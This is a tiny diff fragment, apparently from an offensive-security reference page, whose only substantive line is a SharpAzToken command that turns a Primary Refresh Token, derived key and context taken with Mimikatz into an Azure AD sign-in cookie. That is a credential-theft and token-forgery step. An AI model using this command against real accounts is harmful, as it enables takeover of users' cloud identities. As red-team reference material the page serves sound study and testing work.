@@ -15,3 +15,5 @@ updated_at: '2023-05-24T07:39:52.197066+00:00'
 ```bash
 SharpAzToken.exe cookie --derivedkey <Key from Mimikatz> --context <Context from Mimikatz> --prt <PRT from Mimikatz>
 ```
+
+
